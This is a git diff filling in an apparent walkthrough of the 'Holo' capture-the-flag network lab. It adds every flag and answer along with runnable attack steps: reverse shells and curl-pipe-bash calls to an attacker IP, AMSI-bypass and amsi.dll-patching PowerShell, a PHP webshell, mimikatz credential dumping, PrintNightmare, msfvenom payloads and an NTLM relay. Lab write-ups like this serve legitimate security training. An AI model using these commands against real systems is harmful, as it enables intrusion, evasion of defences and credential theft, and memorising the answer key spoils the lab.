@@ -26,17 +26,17 @@
 
 2. What flag can be found after gaining user on L-SRV01? - HOLO{3792d7d80c4dcabb8a533afddf06f666}
 
-3. What flag can be found after rooting L-SRV01?
+3. What flag can be found after rooting L-SRV01? - HOLO{e16581b01d445a05adb2e6d45eb373f7}
 
-4. What flag can be found on the Web Application on S-SRV01?
+4. What flag can be found on the Web Application on S-SRV01? - HOLO{bcfe3bcb8e6897018c63fbec660ff238}
 
-5. What flag can be found after rooting S-SRV01?
+5. What flag can be found after rooting S-SRV01? - HOLO{50f9614809096ffe2d246e9dd21a76e1}
 
-6. What flag can be found after gaining user on PC-FILESRV01?
+6. What flag can be found after gaining user on PC-FILESRV01? - HOLO{2cb097ab8c412d565ec3cab49c6b082e}
 
-7. What flag can be found after rooting PC-FILESRV01?
+7. What flag can be found after rooting PC-FILESRV01? - HOLO{ee7e68a69829e56e1d5b4a73e7ffa5f0}
 
-8. What flag can be found after rooting DC-SRV01?
+8. What flag can be found after rooting DC-SRV01? - HOLO{29d166d973477c6d8b00ae1649ce3a44}
 ```
 
 ## .NET Basics
@@ -59,21 +59,21 @@
 ## Initial Recon
 
 ```shell
-nmap -sV -sC -p- -v 10.200.107.0/24
+nmap -sV -sC -p- -v 10.200.112.0/24
 #scan given range
 
 #two hosts are up
 
 #we need to scan web server
-nmap -sV -sC -p- -v 10.200.107.33
+nmap -sV -sC -p- -v 10.200.112.33
 
 #aggressive scan for only open ports
-nmap -A -p 22,80,33060 -v 10.200.107.33
+nmap -A -p 22,80,33060 -v 10.200.112.33
 ```
 
 * It is given that our scope of engagement is 10.200.x.0/24 and 192.168.100.0/24 - we can scan the ranges provided.
 
-* As the public-facing web server is up at 10.200.107.33, we can scan all ports.
+* As the public-facing web server is up at 10.200.112.33, we can scan all ports.
 
 * Open ports and services:
 
@@ -218,7 +218,7 @@ ls
 
   ```http://admin.holo.live/dashboard.php?cmd=which%20nc```
 
-  ```http://admin.holo.live/dashboard.php?cmd=/bin/nc -c sh 10.50.103.238 4444```
+  ```http://admin.holo.live/dashboard.php?cmd=/bin/nc -c sh 10.50.109.20 4444```
 
 * We can now upgrade this to a fully interactive TTY shell.
 
@@ -352,7 +352,7 @@ nc -nvlp 53
 
 #in victim machine rce
 #execute url-encoded command
-curl 'http://192.168.100.1:8080/shell-sv.php?cmd=curl%20http%3A%2F%2F10.50.103.238%3A80%2Fshellscript.sh%7Cbash%20%26'
+curl 'http://192.168.100.1:8080/shell-sv.php?cmd=curl%20http%3A%2F%2F10.50.109.20%3A80%2Fshellscript.sh%7Cbash%20%26'
 #this gives us reverse shell on listener
 
 cat /var/www/user.txt
@@ -361,7 +361,7 @@ cat /var/www/user.txt
 
 ```shell
 #!/bin/bash
-bash -i >& /dev/tcp/10.50.103.238/53 0>&1
+bash -i >& /dev/tcp/10.50.109.20/53 0>&1
 ```
 
 * According to given info, we can attempt to escape the container by exploiting the remote database.
@@ -384,7 +384,7 @@ bash -i >& /dev/tcp/10.50.103.238/53 0>&1
 
 * This would be executed from the RCE on target box so as to get reverse shell on our listener; we can use ```curl``` to execute it:
 
-  ```curl http://10.50.103.238:80/shellscript.sh|bash &```
+  ```curl http://10.50.109.20:80/shellscript.sh|bash &```
 
 * We need to URL-encode this command before passing it as parameter to the RCE command.
 
@@ -397,78 +397,618 @@ bash -i >& /dev/tcp/10.50.103.238/53 0>&1
 ## Privilege Escalation - 1
 
 ```shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+cd /tmp
+
+#setup http server in attacker machine
+
+wget http://10.50.109.20:8000/linpeas.sh
+
+chmod +x linpeas.sh
+
+./linpeas.sh
+#check for privesc
+
+#docker has SUID bit set
+#exploit from GTFObins
+
+docker images
+#we have ubuntu image
+
+/usr/bin/docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
+#we get root shell
+
+cat /root/root.txt
+#root flag
 ```
 
-```markdown
-1. What is the full path of the binary with an SUID bit set on L-SRV01?
+* Now that we have shell as 'www-data' user on L-SRV01, we can attempt for privesc using ```linpeas```.
 
-2. What is the full first line of the exploit for the SUID bit?
+* This shows that ```docker``` has SUID bit set, we can get exploit from GTFObins.
+
+* Upon privilege escalation, we get shell as root on L-SRV01; we can get root flag from the /root directory.
+
+```markdown
+1. What is the full path of the binary with an SUID bit set on L-SRV01? - /usr/bin/docker
+
+2. What is the full first line of the exploit for the SUID bit? - sudo install -m =xs $(which docker) .
 ```
 
 ## Post Exploitation - 2
 
-```markdown
-1. What non-default user can we find in the shadow file on L-SRV01?
+```shell
+#in root shell on L-SRV01
+cat /etc/shadow
 
-2. What is the plaintext cracked password from the shadow hash?
+#get hash for linux-admin user
+
+#in attacker machine
+vim hash.txt
+#sha512crypt hash
+
+hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+* We can now attempt to extract hashes from the shadow file.
+
+* Using ```hashcat```, we can crack the password for the user 'linux-admin'.
+
+```markdown
+1. What non-default user can we find in the shadow file on L-SRV01? - linux-admin
+
+2. What is the plaintext cracked password from the shadow hash? - linuxrulez
 ```
 
 ## Pivoting
 
+```shell
+ssh linux-admin@10.200.112.33
+#ssh into L-SRV01
+
+ls -la /usr/bin/docker
+#SUID bit set
+
+/usr/bin/docker run -v /:/mnt --rm -it ubuntu:18.04 chroot /mnt sh
+#we get root on L-SRV01
+
+#for pivoting, we can use sshuttle
+#on attacker machine
+sshuttle -r linux-admin@10.200.112.33 10.200.112.0/24 -x 10.200.112.33
+#proxy in 10.200.112.0/24 network with L-SRV01 10.200.112.33 excluded from subnet
+
+#to scan internal hosts
+#ping sweep from L-SRV01
+for i in {1..254} ;do (ping -c 1 10.200.112.$i | grep "bytes from" | cut -d " " -f 4 | cut -d ":" -f 1 &) ;done
+#this gives us alive hosts
+
+#check for open ports on alive hosts
+for ip in 30 31 35; do echo "10.200.112.$ip:"; for i in {1..15000}; do echo 2>/dev/null > /dev/tcp/10.200.112.$ip/$i && echo "$i open"; done; echo " ";done;
+#this gives us a list of open ports
+```
+
+* Now, we have root access to L-SRV01; as we have password for user 'linux-admin', we can SSH into L-SRV01 and then use the ```docker``` SUID exploit to get root.
+
+* We need to pivot now using a tool like ```chisel``` or ```sshuttle``` in order to access the internal network.
+
+* By running ```sshuttle``` on our attacker machine, we manage to get access to the internal network.
+
+* Now, using our SSH access on L-SRV01, we can scan the internal network for alive hosts.
+
+* We cannot use ```nmap``` in this case due to ICMP errors, so we can use a Bash one-liner to scan the network; this gives us the following hosts:
+
+  * 10.200.112.1
+  * 10.200.112.30
+  * 10.200.112.31
+  * 10.200.112.33
+  * 10.200.112.35
+  * 10.200.112.250
+
+* Excluding the first and last host, and L-SRV01 itself, we have hosts ending with .30, .31 and .35
+
+* We need to check for open ports on these machines now - for this, we can use another bash one-liner.
+
+* Running this command, we get open ports for all three hosts - the open ports show that all the machines in the internal network are Windows hosts.
+
+* As port 80 is open on all machines, we can now check the webpages for the hosts from our attacker machine.
+
+* 10.200.112.30 and 10.200.112.35 have default IIS landing webpages, but 10.200.112.31 has an administrator login page, similar to the one seen previously - we can check it later.
+
 ## Command and Control
+
+```shell
+#to setup covenant
+#download .NET Core SDK 3.1.0
+#setup 
+mkdir -p $HOME/dotnet && tar zxf dotnet-sdk-3.1.426-linux-x64.tar.gz -C $HOME/dotnet
+
+export DOTNET_ROOT=$HOME/dotnet
+
+export PATH=$PATH:$HOME/dotnet
+
+#also edit .zshrc file to permanently add commands
+vim ~/.zshrc
+#add :$HOME/dotnet to end of existing PATH
+#add export DOTNET_ROOT=$HOME/dotnet
+
+dotnet
+#this runs .NET command
+
+#download covenant
+cd /opt
+
+git clone --recurse-submodules https://github.com/cobbr/Covenant
+
+sudo ~/dotnet/dotnet run --project /opt/Covenant/Covenant
+#we can navigate to localhost:7443 to access Covenant
+```
+
+* We can use a C2 server to organize users & deploy modules on a compromised device; in this case, we can use [Covenant](https://github.com/cobbr/Covenant)
+
+* Once we run ```Covenant``` using ```dotnet```, we can access it on <http://127.0.0.1:7443>
+
+* Within ```Covenant```, there are 4 main stages:
+
+  * Creating a listener
+  * Generating a stager
+  * Deploying a grunt
+  * Utilizing the grunt
 
 ## Web App Exploitation - 2
 
+```shell
+#access S-SRV01 home page
+#scan for directories
+feroxbuster -u http://10.200.112.31 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent
+```
+
+* We have identified a new target, S-SRV01 which has a webpage at 10.200.112.31
+
+* We have a couple of possible usernames - 'admin', 'gurag' - from the previous credentials.
+
+* We also have a password reset functionality - trying the username 'gurag' makes the website send a password reset to the email address.
+
+* Going through the cookies and JSON responses from 'Developer Tools' (under the Network or Storage tab), we get a 'user_token' value.
+
+* As the token is leaked to client-side here, we can exploit this in the URL query; feed the token value to '?token' parameter.
+
+* This redirects us to a 'reset.php' page - we can set any password for 'gurag' user.
+
+* We can login to <http://10.200.112.31> now using the creds 'gurag:password123' - this leads us to a home page with an 'Upload Image' functionality.
+
+* From code analysis, it seems the page uses client-side filtering; these can be bypassed using Burp Suite.
+
+* The source code for the webpage shows that it uses whitelisting - any image that isn't ```image/jpeg``` is denied.
+
+* We can try uploading an image file - it gets uploaded.
+
+* Using ```feroxbuster```, we get a directory /images - this contains the uploaded image file.
+
+* So, we can follow the client-side filter bypass technique shown by using Burp Suite, and intercepting "Response to this request" (Server's response), and deleting the JS function/script.
+
+* Now, we can upload a PHP webshell, and go to /images - we have our webshell.
+
+* However, this does not work; there could be some AV at use here.
+
 ```markdown
-1. What user can we control for a password reset on S-SRV01?
+1. What user can we control for a password reset on S-SRV01? - gurag
 
-2. What is the name of the cookie intercepted on S-SRV01?
+2. What is the name of the cookie intercepted on S-SRV01? - user_token
 
-3. What is the size of the cookie intercepted on S-SRV01?
+3. What is the size of the cookie intercepted on S-SRV01? - 110
 
-4. What page does the reset redirect you to when successfully authenticated on S-SRV01?
+4. What page does the reset redirect you to when successfully authenticated on S-SRV01? - reset.php
 ```
 
 ## AV Evasion
 
+* AMSI (Anti-Malware Scan Interface) - PowerShell security feature that will allow any apps/services to integrate into antimalware products; it scans payloads & scripts before execution, inside of runtime.
+
+* [Common bypasses](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/) (usually written in PowerShell and C#) for AMSI include:
+
+  * Patching ```amsi.dll```
+  * Amsi ScanBuffer patch
+  * Forcing errors
+  * Matt Graeber's Reflection
+  * PowerShell downgrade
+
+* Matt Graeber's Reflection:
+
+```[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)```
+
+* Patching ```amsi.dll```:
+
+```powershell
+$MethodDefinition = "
+
+    [DllImport(`"kernel32`")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport(`"kernel32`")]
+    public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+    [DllImport(`"kernel32`")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+";
+#uses C# to call-in functions from Kernel32
+#to identify where amsi.dll has been loaded
+
+$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
+$ABSD = 'AmsiS'+'canBuffer';
+$handle = [Win32.Kernel32]::GetModuleHandle('amsi.dll');
+#load C# and identify AmsiScanBuffer string
+#to get address location
+
+[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress($handle, $ABSD);
+[UInt32]$Size = 0x5;
+[UInt32]$ProtectFlag = 0x40;
+[UInt32]$OldProtectFlag = 0;
+[Win32.Kernel32]::VirtualProtect($BufferAddress, $Size, $ProtectFlag, [Ref]$OldProtectFlag);
+$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3); 
+
+[system.runtime.interopservices.marshal]::copy($buf, 0, $BufferAddress, 6);
+
+#modify memory permissions and patch amsi.dll
+#in order to return a specified value
+```
+
+* Signatures for most AMSI bypasses have been crafted, so AMSI & Defender themselves will catch these bypasses; we need to obfuscate them to evade signatures.
+
+* Tools such as the [AMSITrigger script](https://github.com/RythmStick/AMSITrigger) can help us in manual obfuscation; this script will take a given PowerShell script and identify what strings are used to flag the script as malicious.
+
+* String concatenation is a common technique used in manual obfuscation; for string literals & constants, concatenation occurs at compile-time, whereas for string variables, concatenation occurs at run-time.
+
+* Type acceleration is another method used in manual obfuscation; we can abuse them to modify malicious types and break signatures.
+
+* For automated obfuscation, we can use obfuscators such as [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) and ISE-Steroids.
+
+* For code analysis and review to break signatures, we can use tools like [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) and [DefenderCheck](https://github.com/matterpreter/DefenderCheck).
+
 ## Post Exploitation - 3
 
+```shell
+<html>
+<body>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_GET['cmd']))
+    {
+        system($_GET['cmd']);
+    }
+?>
+</pre>
+</body>
+</html>
+```
+
+```shell
+#use crackmapexec to find endpoints where creds can be used
+crackmapexec smb 10.200.112.0/24 -u watamet -d HOLOLIVE -H d8d41e6cf762a8c77776a1843d4141c9
+#-d for domain, found from mimikatz dump
+
+#evil-winrm pass-the-hash does not work
+
+#xfreerdp works
+xfreerdp /v:10.200.112.35 /u:watamet /p:Nothingtoworry!
+```
+
+```ps
+#in PowerShell session in PC-FILESRV01
+#fetch script from Python server on attacker machine
+
+certutil.exe -urlcache -f http://10.50.109.20/applocker-checker.ps1 applocker-checker.ps1
+
+.\applocer-checker.ps1
+#runs the script
+```
+
+* As we were unable to make a simple webshell work, we will have to use another technique for AV evasion.
+
+* Trying another version of a simple PHP webshell works in this case - we are able to get RCE on S-SRV01.
+
+* ```whoami``` command shows that we are 'system' user - we can get the flag from Admin's desktop.
+
+* We can now use ```mimikatz``` to dump creds on S-SRV01.
+
+* ```certutil``` can be used to transfer the binary to S-SRV01 (remember to host the Python server):
+
+  ```certutil.exe -urlcache -f http://10.50.109.20/mimikatz64.exe mimikatz.exe```
+
+* As ```mimikatz``` has its own CLI, we need to send all commands required in a single command.
+
+* The crafted command will dump account creds authenticated to endpoint:
+
+  ```.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" exit```
+
+* This dumps the required creds; we get the password for user 'watamet'
+
+* We can also use a pass-the-hash attack with tools such as ```crackmapexec``` and ```evil-winrm```
+
+* Using ```crackmapexec```, we are able to find that the creds for user 'watamet' can be used for DC-SRV01, S-SRV01 and PC-FILESRV01.
+
+* We can try getting a shell on PC-FILESRV01 using ```evil-winrm``` but it does not work.
+
+* As we have creds anyways, we can login as 'watamet' using ```xfreerdp``` - user flag can be found on Desktop.
+
+* While attempting to perform situational awareness, we are getting errors due to whitelist application controls set on the server; AppLocker is being used here.
+
+* The policy config for AppLocker is located in ```secpol.msc``` (local/group security policy editor).
+
+* The key rule types under 'Application Control Policies' are:
+
+  * Executable Rules
+  * Windows Installer Rules
+  * Script Rules
+  * Packaged app Rules
+
+* Techniques used to bypass AppLocker:
+
+  * Abuse misconfigs within rules
+  * Signed/Verified packages & binaries (LOLBAS)
+  * PowerShell downgrade
+  * Alternate Data Streams
+
+* We can check for directories that can be used to execute programs using tools like [AppLocker directory checker script](https://github.com/sparcflow/GibsonBird/blob/master/chapter4/applocker-bypas-checker.ps1)
+
+* In the RDP session, open PowerShell and fetch the script from attacker machine; running it shows us the directories we can execute programs in:
+
+  * ```C:\Windows\Tasks```
+  * ```C:\Windows\tracing```
+  * ```C:\Windows\System32\spool\drivers\color```
+  * ```C:\Windows\tracing\ProcessMonitor```
+
 ```markdown
-1. What domain user's credentials can we dump on S-SRV01?
+1. What domain user's credentials can we dump on S-SRV01? - watamet
 
-2. What is the domain user's password that we can dump on S-SRV01?
+2. What is the domain user's password that we can dump on S-SRV01? - Nothingtoworry!
 
-3. What is the hostname of the remote endpoint we can authenticate to?
+3. What is the hostname of the remote endpoint we can authenticate to? - PC-FILESRV01
 ```
 
 ## Situational Awareness - 2
 
+```shell
+#in cmd prompt in PC-FILESRV01
+certutil.exe -urlcache -f http://10.50.109.20/Seatbelt.exe seatbelt.exe
+
+copy seatbelt.exe C:\Windows\Tasks
+#run from path where AppLocker allows running programs
+
+cd C:\Windows\Tasks
+
+seatbelt.exe -group=system
+#run seatbelt
+
+seatbelt.exe -group=all -full
+#gives a lot of output
+#redirect output to a file for easy search
+```
+
+```ps
+#in PowerShell
+cd C:\Windows\Tasks
+
+certutil.exe -urlcache -f http://10.50.109.20/PowerView.ps1 PowerView.ps1
+
+Import-Module .\PowerView.ps1
+#to use the script
+
+Get-NetLocalGroup
+#list all groups
+
+Get-NetLocalGroupMember -Group Administrators
+#list all members of local group 'Administrators'
+
+Get-NetLoggedon
+#list all users currently logged onto system
+
+Get-DomainGPO
+#list AD domain GPOs installed
+
+Find-LocalAdminAccess
+#check if current user is local admin at any connected system
+
+Get-ScheduledTask
+#list all scheduled tasks
+#we can filter paths using -TaskPath
+
+Get-ScheduledTaskInfo -TaskName "Microsoft\Windows\Shell\CreateObjectTask"
+#shows info on task given
+
+whoami /priv
+
+Import-Module ActiveDirectory; Get-ADGroup
+#enumerate user groups within AD
+#prompted to enter filter - use <samAccountName -like "*">
+```
+
+* For situational awareness, we can use the ```Seatbelt``` tool; instead of building the app file, we can use precompiled binaries.
+
+* We can run ```Seatbelt``` after transferring the .exe file to PC-FILESRV01; move it to one of the paths given above, where it is allowed to run.
+
+* We can use ```PowerView``` after this to enumerate users & groups in system.
+
+* ```Find-LocalAdminAccess``` command (part of PowerView module) shows that we have local admin access to S-SRV01.holo.live
+
 ```markdown
-1. What anti-malware product is employed on PC-FILESRV01?
+1. What anti-malware product is employed on PC-FILESRV01? - AMSI
 
-2. What anti-virus product is employed on PC-FILESRV01?
+2. What anti-virus product is employed on PC-FILESRV01? - Windows Defender
 
-3. What CLR version is installed on PC-FILESRV01?
+3. What CLR version is installed on PC-FILESRV01? - 4.0.30319
 
-4. What PowerShell version is installed on PC-FILESRV01?
+4. What PowerShell version is installed on PC-FILESRV01? - 5.1.17763.1
 
-5. What Windows build is PC-FILESRV01 running on?
+5. What Windows build is PC-FILESRV01 running on? - 17763.1577
 ```
 
 ## Privilege Escalation - 2
 
+```ps
+dir C:\Users\watamet\Applications
+#contains the odd exe file
+
+Get-ScheduledTask -TaskPath "\Users\*"
+#should include the exe
+
+#we can try the DLL hijacking method
+#by creating kavremoverENU.dll
+#but it does not work
+
+#try PrintNightmare exploit
+certutil.exe -urlcache -f http://10.50.109.20/CVE-2021-1675.ps1 CVE-2021-1675.ps1
+
+Import-Module .\CVE-2021-1675.ps1
+
+Invoke-Nightmare -NewUser "sv" -NewPassword "password123"
+
+net user sv
+#shows that it is part of Administrators group
+```
+
+* We are able to find an application 'kavremover.exe' in the user's Applications folder, and it is supposed to be a scheduled task but it does not show up as one.
+
+* Either way we can proceed with DLL hijacking technique for privesc.
+
+* For the vulnerable app we found, there are a few reference guides that can be followed for DLL hijacking - but those do not work for some reason.
+
+* As this is an older machine, we can instead use a newer exploit like [PrintNightmare](https://github.com/calebstewart/CVE-2021-1675).
+
+* Transfer the script to victim server and run it - this exploits the vulnerability and we now have Admin access.
+
+* We can get a new shell using ```evil-winrm``` and login as the newly created user to get root flag.
+
 ```markdown
-1. What is the name of the vulnerable application found on PC-FILESRV01?
+1. What is the name of the vulnerable application found on PC-FILESRV01? - kavremover
 ```
 
 ## Persistence
 
+* Vulnerable DLL locations can be searched using tools like ProcMon or Processhacker2; these vulnerable DLLs can be found by using filters or PIDs for instance.
+
+* Requirements for a DLL to be vulnerable:
+
+  * Defined by target app
+  * Ends with .DLL
+  * Must be run by target app
+  * DLL does not exist on system
+  * Write privileges for DLL location
+
 ```markdown
-1. What is the first listed vulnerable DLL located in the Windows folder from the application?
+1. What is the first listed vulnerable DLL located in the Windows folder from the application? - wow64log.dll
 ```
 
 ## NTLM Relay
 
+```shell
+#install the required packages
+sudo apt install krb5-user cifs-utils
+
+#open a new rdp session as admin user created earlier
+xfreerdp /v:10.200.112.35 /u:sv /p:"password123"
+
+#open command prompt as admin user
+#and config the SMB services
+sc stop netlogon
+
+sc stop lanmanserver
+
+sc config lanmanserver start= disabled
+
+sc stop lanmanworkstation
+
+sc config lanmanworkstation start= disabled
+
+shutdown -r
+#restart the machine
+```
+
+```shell
+#in attacker machine
+#create payload
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.50.109.20 LPORT=1337 -f exe > shell.exe
+
+msfconsole -q
+
+use exploit/multi/handler
+
+set payload windows/x64/meterpreter/reverse_tcp
+
+set LHOST 10.50.109.20
+
+set LPORT 1337
+
+run
+
+#in another tab
+#setup ntlmrelayx
+ntlmrelayx.py -t smb://10.200.112.30 -smb2support -socks
+
+#get rdp session
+#xfreerdp is not working, so we use rdesktop instead
+rdesktop -u sv -p password123 10.200.112.35
+
+#in victim cmd prompt
+certutil.exe -urlcache -f http://10.50.109.20:8080/shell.exe shell.exe
+
+shell.exe
+#we get reverse shell
+
+#on meterpreter reverse shell
+getuid
+
+getsystem
+#privesc
+
+portfwd add -R -L 0.0.0.0 -l 445 -p 445
+#setup port forwarding
+
+#config proxy settings
+sudo vim /etc/proxychains4.conf
+#add this line
+#socks4 127.0.0.1 1080
+
+proxychains psexec.py -no-pass HOLOLIVE/SRV-ADMIN@10.200.112.30
+#this does not work, so we can try smbexec.py
+
+proxychains smbexec.py -no-pass HOLOLIVE/SRV-ADMIN@10.200.112.30
+#we get shell
+
+net user newuser password1 /add
+
+net localgroup Administrators /add newuser
+
+#we can now get the flag
+
+#in attacker machine
+secretsdump.py 'HOLOLIVE/newuser:password1@10.200.112.30'
+#dumps creds
+```
+
+* If a server sends out SMB connections, we can abuse NTLM relaying to get the hashes - we can use tools such as ```responder``` or ```ntlmrelayx```.
+
+* Before any of these attacks are used, we first need to check for hosts with SMB signing disabled - we can check this using ```nmap``` or ```crackmapexec```.
+
+* The system at 10.200.112.30 is our target; we can now follow the given process for NTLM relay attack.
+
+* Disable the SMB services in the ```evil-winrm``` shell that we have as admin user and restart the server.
+
+* Then, we create our payload to be executed on the server; we get a reverse shell on our machine.
+
+* Simultaneously, setup ```ntlmrelayx``` for relay client to route sessions through SOCKS proxy.
+
+* Now, on our ```meterpreter``` reverse shell, after using 'getsystem' to elevate our privileges, we can use port forwarding.
+
+* After a few minutes, our ```ntlmrelayx``` prompt shows that we have a working relay from S-SRV02.
+
+* We need to config proxy settings to tunnel through SOCKS session created by ```ntlmrelayx```; edit the file at ```/etc/proxychains4.conf```.
+
+* Then, we can use the tools, namely ```secretsdump.py``` and ```proxychains``` to help us in dumping hashes.
+
 ```markdown
-1. What host has SMB signing disabled?
+1. What host has SMB signing disabled? - DC-SRV01
 ```
